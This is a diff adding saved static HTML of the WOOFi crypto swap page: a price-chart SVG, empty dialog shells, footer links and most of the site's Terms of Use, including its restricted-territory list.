+                              <stop stop-opacity="0" offset="100%" stop-color="#FFFFFF"></stop>
+                            </lineargradient>
+                          </defs>
+                          <path id="line-path" fill="none" stroke="#36D58F" stroke-width="1"
+                            d="M0,290.5229489483602L7.7368421052631575,292.969202670732L15.473684210526315,312.530620364841L23.210526315789473,331.3310975434533L30.94736842105263,344.9077522977574L38.68421052631579,345.3865268022366L46.421052631578945,351L54.1578947368421,335.14222195287493L61.89473684210526,342.46674640103765L69.63157894736841,328.26084896699194L77.36842105263158,315.8518632011153L85.10526315789474,276.871359282188L92.84210526315789,226.44752097706566L100.57894736842104,261.70943572663145L108.3157894736842,270.00477961026513L116.05263157894737,239.21924473558022L123.78947368421052,227.63497697129088L131.52631578947367,225.24899435570126L139.26315789473682,252.65655647333156L147,233.244431217895L154.73684210526315,229.86182336889132L162.4736842105263,224.09413501563773L170.21052631578948,222.04505129677233L177.94736842105263,165.49541243824802L185.68421052631578,204.13123677021147L193.42105263157893,159.34339578685695L201.15789473684208,130.05578666244173L208.89473684210526,78.60642379516474L216.6315789473684,44.607745197773L224.36842105263156,64.71614118743491L232.10526315789474,59.00158183496649L239.8421052631579,123.28521789920518L247.57894736842104,145.9502234620298L255.3157894736842,144.5560194472045L263.05263157894734,168.57002260377678L270.7894736842105,170.09948713825068L278.52631578947364,167.8548431368361L286.2631578947368,162.29755510518666L294,143.65448357206188L301.7368421052631,125.61227348457628L309.4736842105263,145.68013352872492L317.2105263157895,144.10109395878018L324.9473684210526,138.7520633923706L332.6842105263158,125.12175488883443L340.42105263157896,109.39332056360998L348.1578947368421,90.65009908825945L355.89473684210526,102.76332013721012L363.6315789473684,113.36261077724333L371.36842105263156,113.49375579847087L379.10526315789474,51.09242640016235L386.84210526315786,84.11431030492426L394.57894736842104,83.97996272889955L402.31578947368416,72.6793641465767L410.05263157894734,39L417.7894736842105,72.95638926117965L425.52631578947364,69.4680060552932L433.2631578947368,103.4478871700667L441,139.19081241404518L448.7368421052631,121.74968527009119L456.4736842105263,139.81559833395542L464.2105263157895,139.3696399390095L471.9473684210526,112.83112603748879L479.6842105263158,124.00442295368151L487.4210526315789,131.9875849489128L495.1578947368421,119.17434804673479L502.89473684210526,132.04153182723152L510.6315789473684,130.81744475660935L518.3684210526316,149.20644149280764L526.1052631578947,133.4675634174691L533.8421052631579,91.4576958505198L541.578947368421,102.21942650653901L549.3157894736842,110.6265214042209L557.0526315789473,100.04550048572221L564.7894736842105,87.72168950304052L572.5263157894736,101.3858199955771L580.2631578947368,71.98920545021178L588,63.86188774032815L595.7368421052631,90.83688290723582L603.4736842105262,106.48363951266755L611.2105263157895,111.39647700434374L618.9473684210526,74.62226200787025L626.6842105263157,94.48559342026428L634.421052631579,101.31946406898938L642.1578947368421,109.55233727594995L649.8947368421052,178.07945964127936L657.6315789473684,209.6021625769809L665.3684210526316,176.20163048716864L673.1052631578947,170.9482407409951L680.8421052631579,131.4954564658614L688.578947368421,158.7721496617666L696.3157894736842,196.02013703893107L704.0526315789473,199.43076396196213L711.7894736842105,198.12261587936624L719.5263157894736,169.72272820256882L727.2631578947368,182.7615736666369L735,183.82132363564358"
+                            style="transition: stroke-dashoffset 0.4s ease-in-out 0s; stroke-dasharray: 2063.43, 2063.43; stroke-dashoffset: 0;">
+                          </path>
+                          <path id="line-path2" fill="url(#line-up-fill-color-item36D58F)"
+                            d="M0,290.5229489483602L7.7368421052631575,292.969202670732L15.473684210526315,312.530620364841L23.210526315789473,331.3310975434533L30.94736842105263,344.9077522977574L38.68421052631579,345.3865268022366L46.421052631578945,351L54.1578947368421,335.14222195287493L61.89473684210526,342.46674640103765L69.63157894736841,328.26084896699194L77.36842105263158,315.8518632011153L85.10526315789474,276.871359282188L92.84210526315789,226.44752097706566L100.57894736842104,261.70943572663145L108.3157894736842,270.00477961026513L116.05263157894737,239.21924473558022L123.78947368421052,227.63497697129088L131.52631578947367,225.24899435570126L139.26315789473682,252.65655647333156L147,233.244431217895L154.73684210526315,229.86182336889132L162.4736842105263,224.09413501563773L170.21052631578948,222.04505129677233L177.94736842105263,165.49541243824802L185.68421052631578,204.13123677021147L193.42105263157893,159.34339578685695L201.15789473684208,130.05578666244173L208.89473684210526,78.60642379516474L216.6315789473684,44.607745197773L224.36842105263156,64.71614118743491L232.10526315789474,59.00158183496649L239.8421052631579,123.28521789920518L247.57894736842104,145.9502234620298L255.3157894736842,144.5560194472045L263.05263157894734,168.57002260377678L270.7894736842105,170.09948713825068L278.52631578947364,167.8548431368361L286.2631578947368,162.29755510518666L294,143.65448357206188L301.7368421052631,125.61227348457628L309.4736842105263,145.68013352872492L317.2105263157895,144.10109395878018L324.9473684210526,138.7520633923706L332.6842105263158,125.12175488883443L340.42105263157896,109.39332056360998L348.1578947368421,90.65009908825945L355.89473684210526,102.76332013721012L363.6315789473684,113.36261077724333L371.36842105263156,113.49375579847087L379.10526315789474,51.09242640016235L386.84210526315786,84.11431030492426L394.57894736842104,83.97996272889955L402.31578947368416,72.6793641465767L410.05263157894734,39L417.7894736842105,72.95638926117965L425.52631578947364,69.4680060552932L433.2631578947368,103.4478871700667L441,139.19081241404518L448.7368421052631,121.74968527009119L456.4736842105263,139.81559833395542L464.2105263157895,139.3696399390095L471.9473684210526,112.83112603748879L479.6842105263158,124.00442295368151L487.4210526315789,131.9875849489128L495.1578947368421,119.17434804673479L502.89473684210526,132.04153182723152L510.6315789473684,130.81744475660935L518.3684210526316,149.20644149280764L526.1052631578947,133.4675634174691L533.8421052631579,91.4576958505198L541.578947368421,102.21942650653901L549.3157894736842,110.6265214042209L557.0526315789473,100.04550048572221L564.7894736842105,87.72168950304052L572.5263157894736,101.3858199955771L580.2631578947368,71.98920545021178L588,63.86188774032815L595.7368421052631,90.83688290723582L603.4736842105262,106.48363951266755L611.2105263157895,111.39647700434374L618.9473684210526,74.62226200787025L626.6842105263157,94.48559342026428L634.421052631579,101.31946406898938L642.1578947368421,109.55233727594995L649.8947368421052,178.07945964127936L657.6315789473684,209.6021625769809L665.3684210526316,176.20163048716864L673.1052631578947,170.9482407409951L680.8421052631579,131.4954564658614L688.578947368421,158.7721496617666L696.3157894736842,196.02013703893107L704.0526315789473,199.43076396196213L711.7894736842105,198.12261587936624L719.5263157894736,169.72272820256882L727.2631578947368,182.7615736666369L735,183.82132363564358L735,390L0,390"
+                            style="transition: visibility 2s ease 0s, opacity 1s ease-in-out 0s; stroke-dasharray: 3004.61, 3004.61; stroke-dashoffset: 3004.61; visibility: visible; opacity: 1;">
+                          </path>
+                          <g id="circle-g">
+                            <circle id="circle-point" fill="#36D58F" stroke-width="2" stroke="#FFF" cx="-10"
+                              cy="130.817626953125" r="5"></circle>
+                          </g>
+                          <g id="circle-g">
+                            <circle id="circle-point" fill="#FF5072" stroke-width="2" stroke="#FFF" cx="-10" cy="20"
+                              r="5"></circle>
+                          </g>
+                          <g id="circle-g">
+                            <circle id="circle-point" fill="#FF5072" stroke-width="2" stroke="#FFF" cx="-10" cy="20"
+                              r="5"></circle>
+                          </g>
+                        </svg></div>
+                    </div><!---->
+                  </div>
+                </div>
+              </div>
+              <div data-v-610702e6="" class="compare" bis_skin_checked="1">
+                <div data-v-6c7c3c80="" data-v-610702e6="" class="exchange" bis_skin_checked="1">
+                  <div data-v-6c7c3c80="" class="compare" bis_skin_checked="1">
+                    <div data-v-6c7c3c80="" class="no-search" bis_skin_checked="1"><img data-v-6c7c3c80=""
+                        src="./assets/380d82e.png"><span data-v-6c7c3c80="">Enter amounts to get quotes and
+                        routes.</span></div>
+                  </div>
+                </div>
+              </div>
+              <div data-v-610702e6="" class="history" bis_skin_checked="1">
+                <div data-v-7ae9e9d5="" data-v-610702e6="" class="exchange" bis_skin_checked="1">
+                  <div data-v-7ae9e9d5="" class="top flex-all" bis_skin_checked="1">
+                    <div data-v-7ae9e9d5="" class="title bold" bis_skin_checked="1">My History</div>
+                    <div data-v-7ae9e9d5="" class="tab flex-align hide" bis_skin_checked="1">
+                      <div data-v-7ae9e9d5="" class="item touch" bis_skin_checked="1">All</div>
+                      <div data-v-7ae9e9d5="" class="item touch active" bis_skin_checked="1">Mine</div>
+                    </div>
+                  </div>
+                  <div data-v-7ae9e9d5="" class="mid" bis_skin_checked="1">
+                    <div data-v-7ae9e9d5="" class="no-data" bis_skin_checked="1"><img data-v-7ae9e9d5=""
+                        src="./assets/3dbc9af.png">
+                      <div data-v-7ae9e9d5="" class="note" bis_skin_checked="1">No History</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div data-v-575279a6="" data-v-610702e6="" class="setting" bis_skin_checked="1">
+                <div data-v-575279a6="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Settings" class="el-dialog normal-dialog"
+                    bis_skin_checked="1" style="margin-top: 15vh; width: 500px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span
+                        class="el-dialog__title">Settings</span><button type="button" aria-label="Close"
+                        class="el-dialog__headerbtn"><i class="el-dialog__close el-icon el-icon-close"></i></button>
+                    </div><!----><!---->
+                  </div>
+                </div>
+              </div>
+              <div data-v-498cbffc="" data-v-610702e6="" class="confirm" bis_skin_checked="1">
+                <div data-v-498cbffc="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Confirm Cross-Chain Swap"
+                    class="el-dialog normal-dialog" bis_skin_checked="1" style="margin-top: 15vh; width: 540px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Confirm
+                        Cross-Chain Swap</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                          class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                  </div>
+                </div>
+              </div>
+              <div data-v-2c0e7190="" data-v-610702e6="" class="confirm" bis_skin_checked="1">
+                <div data-v-2c0e7190="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Confirm Swap" class="el-dialog" bis_skin_checked="1"
+                    style="margin-top: 15vh; width: 460px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Confirm
+                        Swap</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                          class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                  </div>
+                </div>
+              </div>
+              <div data-v-ea9b18f2="" data-v-610702e6="" class="confirm" bis_skin_checked="1">
+                <div data-v-ea9b18f2="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Confirm Swap" class="el-dialog" bis_skin_checked="1"
+                    style="margin-top: 15vh; width: 460px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Confirm
+                        Swap</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                          class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                  </div>
+                </div>
+              </div><!---->
+              <div data-v-6161ec0e="" data-v-610702e6="" class="tous" bis_skin_checked="1">
+                <div data-v-6161ec0e="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Cross Chain Swap" class="el-dialog"
+                    bis_skin_checked="1" style="margin-top: 15vh; width: 670px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Cross Chain
+                        Swap</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                          class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                  </div>
+                </div>
+              </div>
+              <div data-v-750f7134="" data-v-610702e6="" class="queue" bis_skin_checked="1"><!---->
+                <div data-v-750f7134="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Clear All Notifications"
+                    class="el-dialog confirm-dialog" bis_skin_checked="1" style="margin-top: 15vh; width: 510px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Clear All
+                        Notifications</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                          class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                  </div>
+                </div>
+                <div data-v-750f7134="" class="el-dialog__wrapper cross-status-dialog" style="display: none;"
+                  bis_skin_checked="1">
+                  <div role="dialog" aria-modal="true" aria-label="Waiting For Completion" class="el-dialog"
+                    bis_skin_checked="1" style="margin-top: 15vh; width: 600px;">
+                    <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Waiting For
+                        Completion</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                          class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <footer data-v-9c881bac="">
+            <div data-v-9c881bac="" class="group" bis_skin_checked="1">
+              <div data-v-9c881bac="" class="list touch" bis_skin_checked="1">
+                <div data-v-9c881bac="" class="title" bis_skin_checked="1">Powered by</div>
+                <div data-v-9c881bac="" class="logo" bis_skin_checked="1"><img data-v-9c881bac=""
+                    src="./assets/9cc288f.png"></div>
+              </div>
+              <div data-v-9c881bac="" class="list" bis_skin_checked="1">
+                <div data-v-9c881bac="" class="title" bis_skin_checked="1">Resources</div>
+                <div data-v-9c881bac="" class="sub-item" bis_skin_checked="1">
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">WOOFi
+                      Brokers</span></div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">Docs</span>
+                  </div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">Audits</span>
+                  </div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">Terms of
+                      Use</span></div>
+                </div>
+              </div>
+              <div data-v-9c881bac="" class="list" bis_skin_checked="1">
+                <div data-v-9c881bac="" class="title" bis_skin_checked="1">Links</div>
+                <div data-v-9c881bac="" class="sub-item" bis_skin_checked="1">
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span
+                      data-v-9c881bac="">DefiLlama</span></div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">WOOFi
+                      NFT</span></div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">Github</span>
+                  </div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><span data-v-9c881bac="">Immunefi Bug
+                      Bounty</span></div>
+                </div>
+              </div>
+              <div data-v-9c881bac="" class="list" bis_skin_checked="1">
+                <div data-v-9c881bac="" class="title" bis_skin_checked="1">Social Media</div>
+                <div data-v-9c881bac="" class="img-items flex-align" bis_skin_checked="1">
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><img data-v-9c881bac=""
+                      src="./assets/3ef6c78.png"></div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><img data-v-9c881bac=""
+                      src="./assets/6163e1c.png"></div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><img data-v-9c881bac=""
+                      src="./assets/cc23840.png"></div>
+                  <div data-v-9c881bac="" class="item touch" bis_skin_checked="1"><img data-v-9c881bac=""
+                      src="./assets/61a4bca.png"></div>
+                </div>
+              </div>
+            </div>
+            <div data-v-6234d9e5="" data-v-9c881bac="" class="tous" bis_skin_checked="1">
+              <div data-v-6234d9e5="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                <div role="dialog" aria-modal="true" aria-label="Terms of Use" class="el-dialog" bis_skin_checked="1"
+                  style="margin-top: 15vh; width: 670px;">
+                  <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Terms of
+                      Use</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                        class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                </div>
+              </div>
+            </div>
+          </footer>
+          <div data-v-2fd23e10="" class="banip" bis_skin_checked="1">
+            <div data-v-2fd23e10="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+              <div role="dialog" aria-modal="true" aria-label="WE&#39;RE SORRY..." class="el-dialog"
+                bis_skin_checked="1" style="margin-top: 15vh; width: 560px;">
+                <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">WE'RE
+                    SORRY...</span><!----></div><!----><!---->
+              </div>
+            </div>
+            <div data-v-6234d9e5="" data-v-2fd23e10="" class="tous" bis_skin_checked="1">
+              <div data-v-6234d9e5="" class="el-dialog__wrapper" style="z-index: 2002; display: none;"
+                bis_skin_checked="1">
+                <div role="dialog" aria-modal="true" aria-label="Terms of Use" class="el-dialog" bis_skin_checked="1"
+                  style="margin-top: 15vh; width: 670px;">
+                  <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Terms of
+                      Use</span><!----></div>
+                  <div class="el-dialog__body" bis_skin_checked="1">
+                    <div data-v-6234d9e5="" id="tou-content" class="confirm-dialog" bis_skin_checked="1">
+                      <p data-v-6234d9e5="">The following terms of use (the “Terms”) constitute an agreement between you
+                        or the company or other legal entity you represent (“you” or “your”) and WOO Network Ecosystem
+                        (WOO Network Ecosystem,” “we,” or “us”), and apply to your use of WOOFi, https://fi.woo.org.</p>
+                      <p data-v-6234d9e5="">You agree that you have read, understood, and accepted these Terms as well
+                        as our policies disclosed and updated from time to time, and you acknowledge and agree that you
+                        will be bound by such terms and policies.</p>
+                      <h3 data-v-6234d9e5="">1. ELIGIBILITY</h3>
+                      <p data-v-6234d9e5="">If you are an individual, you must be of legal age in the jurisdiction in
+                        which you reside and you have the legal capacity to enter into these Terms.</p>
+                      <p data-v-6234d9e5="">If you are on behalf of a legal entity, you represent and warrant that (i)
+                        such legal entity is duly organized and validly existing under the applicable laws of the
+                        jurisdiction of its organization; (ii) you are duly authorized by such legal entity to act on
+                        its behalf.</p>
+                      <p data-v-6234d9e5="">By accessing or using WOOFi, you further represent and warrant that you are
+                        not a Restricted Person nor are you a resident of a Restricted Territory (each as defined in
+                        Section 2) and you will not be using WOOFi for any illegal activity including, but not limited
+                        to, those Restricted Activities listed under Section 3. Notwithstanding the foregoing, we may
+                        determine not to make the services, in whole or in part, available in every market, either in
+                        its sole discretion or due to legal or regulatory requirements, depending on your location.
+                        Additionally, use of a virtual private network (e.g., a VPN) or other means by Restricted
+                        Persons or persons from Restricted Territories to access or use our service is prohibited.</p>
+                      <h3 data-v-6234d9e5="">2. LEGAL COMPLIANCE</h3>
+                      <p data-v-6234d9e5="">1) You agree that you are solely and entirely responsible for compliance
+                        with all laws and regulations that may apply to you. You further agree that we have no
+                        obligation to inform you of any potential liabilities or violations of law or regulation that
+                        may arise in connection with your access and use of our service and that we are not liable in
+                        any respect for any failure by you to comply with any applicable laws or regulations.</p>
+                      <p data-v-6234d9e5="">You may not use our services if (i) you are incorporated or otherwise
+                        established in, or a citizen or resident a prohibited jurisdiction as follows (“Restricted
+                        Territories”), including but not limited to:</p>
+                      <ul data-v-6234d9e5="">
+                        <li data-v-6234d9e5="">Iran</li>
+                        <li data-v-6234d9e5="">North Korea</li>
+                        <li data-v-6234d9e5="">Cuba</li>
+                        <li data-v-6234d9e5="">Syria</li>
+                        <li data-v-6234d9e5="">Crimea and Sevastopol</li>
+                        <li data-v-6234d9e5="">Afghanistan</li>
+                        <li data-v-6234d9e5="">Libya</li>
+                        <li data-v-6234d9e5="">Mali</li>
+                        <li data-v-6234d9e5="">South Sudan</li>
+                        <li data-v-6234d9e5="">Sudan</li>
+                        <li data-v-6234d9e5="">Donetsk</li>
+                        <li data-v-6234d9e5="">Luhansk</li>
+                        <li data-v-6234d9e5="">US and its territories</li>
+                        <li data-v-6234d9e5="">China</li>
+                        <li data-v-6234d9e5="">Democratic Republic of Congo</li>
+                        <li data-v-6234d9e5="">Myanmar</li>
+                        <li data-v-6234d9e5="">Cayman Island</li>
+                        <li data-v-6234d9e5="">Canada</li>
+                      </ul>
+                      <p data-v-6234d9e5="">WOO Network Ecosystem has the sole discretion to update the list of
+                        prohibited jurisdictions from time to time ; (ii) you are a member of any sanctions list or
+                        equivalent maintained by the United States government, the United Kingdom government, the
+                        European Union, or the Taiwan government (“Restricted Persons”); (iii) you intend to transact
+                        with any Restricted Territories or Restricted Persons; (iv) you are located, incorporated or
+                        otherwise established in, or a citizen or resident of a jurisdiction where it would be illegal
+                        under applicable laws for you (by reason of your nationality, domicile, citizenship, residence
+                        or otherwise) to access or use our services; or (v) the publication or availability of our
+                        services is prohibited or contrary to local law or regulation, or could subject WOO Network
+                        Ecosystem to any local registration or licensing requirements.</p>
+                      <p data-v-6234d9e5="">In order to comply with legal obligations under applicable rules and
+                        regulations, we may conduct AML/CFT procedure, anti-fraud procedure, and authentication checks.
+                      </p>
+                      <h3 data-v-6234d9e5="">3. RESTRICTED ACTIVITIES</h3>
+                      <p data-v-6234d9e5="">In connection with your use of our services, you will not:</p>
+                      <ul data-v-6234d9e5="">
+                        <li data-v-6234d9e5="">violate or assist any party in violating any law, statute, ordinance,
+                          regulation or any rule of any self-regulatory or similar organization of which you are or are
+                          required to be a member through your use of our services;</li>
+                        <li data-v-6234d9e5="">provide false, inaccurate, incomplete or misleading information;</li>
+                        <li data-v-6234d9e5="">infringe upon WOO Network Ecosystem's or any third party's copyright,
+                          patent, trademark, or intellectual property rights;</li>
+                        <li data-v-6234d9e5="">engage in any illegal activity, including without limitation illegal
+                          gambling, money laundering, fraud, blackmail, extortion, ransoming data, the financing of
+                          terrorism, other violent activities or any prohibited market practices;</li>
+                        <li data-v-6234d9e5="">distribute unsolicited or unauthorized advertising or promotional
+                          material, written media releases, public announcements and public disclosures, junk mail, spam
+                          or chain letters;</li>
+                        <li data-v-6234d9e5="">take any action that imposes an unreasonable or disproportionately large
+                          load on our infrastructure, or detrimentally interfere with, intercept, or expropriate any
+                          system, data or information;</li>
+                        <li data-v-6234d9e5="">transmit or upload any material to WOOFi that contains viruses, Trojan
+                          horses, worms, or any other harmful or deleterious programs;</li>
+                        <li data-v-6234d9e5="">transfer any rights granted to you under these Terms;</li>
+                        <li data-v-6234d9e5="">engage in any other activity which, in our reasonable opinion, amounts to
+                          or may amount to market abuse including without limitation the carrying out of fictitious
+                          transactions or wash trades, front running or engaging in disorderly market conduct; or</li>
+                        <li data-v-6234d9e5="">engage in any behavior which is unlawful, violates these Terms, or is
+                          otherwise deemed unacceptable by WOO Network Ecosystem in its sole discretion.</li>
+                      </ul>
+                      <h3 data-v-6234d9e5="">4. FEES AND PRICE ESTIMATES</h3>
+                      <p data-v-6234d9e5="">In connection with your use of our services, you are required to pay all
+                        fees necessary for interacting with the blockchain networks, including “gas” costs, as well as
+                        all other fees reflected on WOOFi at the time of your use. Although we attempt to provide
+                        accurate fee information, this information reflects our estimates of fees, which may vary from
+                        the actual fees paid to use the services and interact with the blockchain networks.</p>
+                      <h3 data-v-6234d9e5="">5. NO PROFESSIONAL ADVICE OR FIDUCIARY DUTIES</h3>
+                      <p data-v-6234d9e5="">We do not advise on the merits of any particular transactions, trading
+                        risks, or tax consequences, and do not provide any other financial, investment, or legal advice
+                        in connection with our service. To the extent that we or our representatives provide trading
+                        recommendations, market commentary, or any other information, the act of doing so is incidental
+                        to your relationship with us and such information should not be construed as investment or
+                        financial advice. Any decision to buy or sell digital assets is the user’s decision and we will
+                        not be liable for any loss suffered. You accept the risk of trading digital assets. In entering
+                        into any transaction via WOOFi, you represent that you have been, are, and will be solely
+                        responsible for making your own independent appraisal and investigations into the risks of the
+                        transaction and the underlying digital asset. You represent that you have sufficient knowledge,
+                        market sophistication, professional advice and experience to make your own evaluation of the
+                        merits and risks of any transaction or any underlying digital asset. The Terms are not intended
+                        to, and do not, create or impose any fiduciary duties on us. To the fullest extent permitted by
+                        law, you acknowledge and agree that we owe no fiduciary duties or liabilities to you or any
+                        other party.</p>
+                      <h3 data-v-6234d9e5="">6. OWNERSHIP OF DIGITAL ASSETS</h3>
+                      <p data-v-6234d9e5="">You hereby represent and warrant to us that any digital assets used by you
+                        in connection with our services are either owned by you or that you are validly authorized to
+                        carry out transactions using such digital assets.</p>
+                      <h3 data-v-6234d9e5="">7. TAXES</h3>
+                      <p data-v-6234d9e5="">It is your responsibility to determine what, if any, taxes apply to your
+                        activities on WOOFi, and to collect, report, and remit the correct tax to the appropriate tax
+                        authority. WOO Network Ecosystem is not responsible for determining whether taxes apply to your
+                        transaction, or for collecting, reporting, or remitting any taxes arising from any transaction.
+                      </p>
+                      <h3 data-v-6234d9e5="">8. INDEMNIFICATION; RELEASE</h3>
+                      <p data-v-6234d9e5="">You agree to indemnify and hold WOO Network Ecosystem, its affiliates, and
+                        service providers, and each of their officers, directors, agents, joint venturers, employees,
+                        and representatives harmless from any claim or demand (including attorneys’ fees and any losses,
+                        fines, fees, or penalties imposed by any regulatory authority) arising out of your breach of
+                        these Terms, or your violation of any law or regulation. The term “losses” means all net costs
+                        reasonably incurred by us or the other persons referred to in this Section which are the result
+                        of the matters set out in this Section and which may relate to any claims, demands, causes of
+                        action, debt, cost, expense or other liability, including reasonable legal fees (without
+                        duplication). If you have a dispute with one or more Users or third parties, you release WOO
+                        Network Ecosystem (and its affiliates and service providers, and each of their officers,
+                        directors, agents, joint ventures, employees, and representatives) from any and all claims,
+                        demands, and damages (actual and consequential) of every kind and nature arising out of or in
+                        any way connected with such disputes. If you have a dispute with anyone other than WOO Network
+                        Ecosystem, you release us from liability associated with that dispute.</p>
+                      <h3 data-v-6234d9e5="">9. PRIVACY POLICY</h3>
+                      <p data-v-6234d9e5="">This Privacy Policy (hereinafter “Policy) constitutes a part of the Terms
+                        used in this Policy shall have the same meanings as in the Terms except as otherwise provided
+                        herein. This Policy explains how we collect, use, process, disclose, share, transfer, and
+                        protect personal information obtained through us and our partners. This Policy also describes
+                        how we comply with our legal obligations to you, and how we respect your ability to know,
+                        access, correct, transfer, restrict the processing of, and delete, your data. By using our
+                        platform, you agree to the collection, use, storage, and disclosure of your data in accordance
+                        with our Privacy Policy. We do not sell or lease the personal data that we have collected (and
+                        will not do so without providing a right to opt out).</p>
+                      <h4 data-v-6234d9e5="">9.1 Applicability of this Policy</h4>
+                      <p data-v-6234d9e5="">This Policy applies to our services, which include the services we provide
+                        on any other websites, pages, features, or content we own or operating third party applications
+                        relying on such an API, and related services.</p>
+                      <h4 data-v-6234d9e5="">9.2 Safety and Security</h4>
+                      <p data-v-6234d9e5="">We may use acquired information to help maintain the safety, security, and
+                        integrity of you and our services.</p>
+                      <h3 data-v-6234d9e5="">10. DISCLAIMER</h3>
+                      <p data-v-6234d9e5="">WOOFi is a developer of open-source software does not offer trade execution
+                        or clearing services and, therefore, has no oversight, involvement, or control concerning your
+                        transactions using our services. All transactions between users of this open-source software are
+                        executed directly between the users’ blockchain addresses through a smart contract.</p>
+                      <p data-v-6234d9e5="">You understand and agree that WOOFi enables access to an online,
+                        decentralized and autonomous protocol and environment, and associated decentralized networks,
+                        that are not controlled by the WOO Network Ecosystem.</p>
+                      <p data-v-6234d9e5="">We do not have access to your private key and cannot initiate an interaction
+                        with your digital assets or otherwise access your digital assets. We are not responsible for any
+                        activities that you engage in when using your wallet, or WOOFi. We cannot and does not represent
+                        or guarantee that any of the information available through the WOOFi is accurate, reliable,
+                        current, complete or appropriate for your needs.</p>
+                      <p data-v-6234d9e5="">You expressly understand and agree that your use of WOOFi is at your sole
+                        risk. We make and expressly disclaim all representations and warranties, express, implied or
+                        statutory, and with respect to WOOFi and the code proprietary or open-source, we specifically do
+                        not represent and warrant and expressly disclaim any representation or warranty, express,
+                        implied or statutory, including without limitation, any representations or warranties of title,
+                        non-infringement, merchantability, usage, security, suitability or fitness for any particular
+                        purpose, or as to the workmanship or technical coding thereof, or the absence of any defects
+                        therein, whether latent or patent.</p>
+                      <p data-v-6234d9e5="">You understand that we are not registered or licensed by the CFTC, SEC, or
+                        any financial regulatory authority. No financial regulatory authority has reviewed or approved
+                        the use of WOOFi. Our services do not constitute advice or a recommendation concerning any
+                        commodity, security, or other digital asset or instrument.</p>
+                      <p data-v-6234d9e5="">You acknowledge that WOO Network Ecosystem is not responsible for
+                        transferring, safeguarding, or maintaining your private keys or any digital assets associated
+                        therewith. If you lose, mishandle or have stolen associated your private keys, you acknowledge
+                        that you may not be able to recover associated digital assets and that WOO Network Ecosystem is
+                        not responsible for such loss. You acknowledge that WOO Network Ecosystem is not responsible for
+                        any loss, damage or liability arising from your failure to comply with the Terms hereunder.</p>
+                      <p data-v-6234d9e5="">OUR SERVICES ARE NOT OFFERED TO PERSONS OR ENTITIES WHO RESIDE IN, ARE
+                        CITIZENS OF, ARE LOCATED IN, ARE INCORPORATED IN, OR HAVE A REGISTERED OFFICE IN THE UNITED
+                        STATES OF AMERICA (COLLECTIVELY, “US PERSONS”). MOREOVER, NONE OF OUR OTHER SERVICES ARE OFFERED
+                        TO PERSONS OR ENTITIES WHO RESIDE IN, ARE CITIZENS OF, ARE LOCATED IN, ARE INCORPORATED IN, OR
+                        HAVE A REGISTERED OFFICE IN ANY RESTRICTED TERRITORY. WE DO NOT MAKE EXCEPTIONS; THEREFORE, IF
+                        YOU ARE A US PERSON, THEN DO NOT ATTEMPT TO USE OUR SERVICES AND IF YOU ARE A RESTRICTED PERSON,
+                        THEN DO NOT ATTEMPT TO USE ANY OF OUR SERVICES. USE OF A VIRTUAL PRIVATE NETWORK (“VPN”) TO
+                        CIRCUMVENT THE RESTRICTIONS SET FORTH HEREIN IS PROHIBITED.</p>
+                      <h3 data-v-6234d9e5="">11. LIMITATION OF LIABILITY; NO WARRANTY</h3>
